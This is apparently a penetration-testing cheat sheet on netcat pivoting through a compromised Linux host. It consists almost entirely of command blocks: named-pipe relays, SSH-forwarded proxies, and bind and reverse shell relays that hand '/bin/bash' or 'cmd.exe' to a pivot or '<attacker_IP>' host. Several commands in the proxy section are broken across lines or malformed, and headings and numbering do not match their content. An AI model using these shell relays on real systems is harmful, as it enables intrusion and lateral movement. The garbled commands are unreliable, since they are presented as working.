# Netcat

## 01 - Pivoting Listening Ports

Let's say you're stuck in a situation that there's no other way to perform pivoting except one of the netcat variants were preinstalled in the compromised Linux system.

```
$ mkfifo /tmp/backpipe

$ mknod /tmp/backpipe p

$ nc -lnvp <pivot_PORT> 0 < /tmp/backpipe | nc <bind_IP> <bind_PORT> 1 > /tmp/backpipe
```

## 02 - Scenarios

### 2.1 - Server-to-Client Relay

> [!INFO] Netcat Port Forwarding
> You can bind any exposed port to establish connection as long it works. Do not limit yourself to one specific service.

```
$ mknod /tmp/backpipe pipe; nc -lnvp 8443 0 < /tmp/backpipe | nc <webserver_IP> 443 1 > /tmp/backpipe
```

Another way is to port forward through SSH then pipe it in the `netcat` listener.

```
$ mkfifo /tmp/backpipe pipe

$ while [ 1 ]; do nc -lp 8443 < /tmp/backpipe | ssh <ssh_server_IP> [-p <PORT>] "nc <webserver_IP> 80" | tee /tmp/backpipe; done
```

Then use `curl` to check connect to the pivot server.

```
userware@hackware-os:~$ curl -k http://<pivot_IP>:8443
```

### 2.2 - Examples

#### 1.2.2 - Proxy (Port 80 to 8080)

```
$ mknod /tmp/backpipe pipe; nc -l -p 8080 0 & < /tmp/backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1 > /tmp/backpipe

$ mknod

$ /tmp/backpipe pipe; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc
```

#### 1.2.3 - Proxy monitor (Port 80 to 8080)

```
$ localhost 80 | tee -a outflow & 1 > /tmp/backpipe
```

### 2.3 - Port Forward Bind Shells

#### 2.3.1 - Server-to-Client Relay

```
userware@hackware-os:~$ nc <pivot_IP> <pivot_PORT>
```

```
user@pivot:~$ mknod /tmp/backpipe

user@pivot:~$ nc -lvnp <pivot_PORT> < /tmp/backpipe | nc <target_IP> <target_PORT> > /tmp/backpipe
```

```
user@computer:~$ nc -lp <target_PORT> -e /bin/bash

C:\> nc -lp <target_PORT> -e cmd.exe
```

#### 2.3.2 - Server-to-Server Relay

```
userware@hackware-os:~$ nc <pivot_IP> <pivot_PORT_1>
```

Open two listeners.

```
user@pivot:~$ mknod /tmp/backpipe

user@pivot:~$ nc -lvnp <pivot_PORT_1> < /tmp/backpipe | nc -lvnp <pivot_PORT_2> > /tmp/backpipe
```

```
user@computer:~$ nc <pivot_IP> <pivot_PORT_2> -e /bin/bash

C:\> nc <pivot_IP> <pivot_PORT_2> -e cmd.exe
```

### 2.4 - Port Forward Bind Shells

#### 2.4.1 -Client-to-Server Relay

```
userware@hackware-os:~$ nc -lnvp <attacker_PORT>
```

```
user@pivot:~$ mknod /tmp/backpipe

user@pivot:~$ nc <attacker_IP> <attacker_PORT> < /tmp/backpipe | nc -lnvp <pivot_PORT> > /tmp/backpipe
```

```
user@computer:~$ nc <pivot_IP> <pivot_PORT> -e /bin/bash

C:\> nc <pivot_IP> <pivot_PORT> -e cmd.exe
```

#### 2.4.2 -Client-to-Client Relay

```
userware@hackware-os:~$ nc -lnvp <attacker_PORT>
```

```
user@pivot:~$ mknod /tmp/backpipe

user@pivot:~$ nc <attacker_IP> <attacker_PORT> < /tmp/backpipe | nc <target_IP> <target_PORT> > /tmp/backpipe
```

```
user@computer:~$ nc -lp <target_PORT> -e /bin/bash

C:\> nc -lp <target_PORT> -e cmd.exe
```

---
## References

- [Michael Nikitochkin: Netcat with SSH Port Forwarding](https://medium.com/notes-and-tips-in-full-stack-development/netcat-with-ssh-port-forwarding-148177b2e850)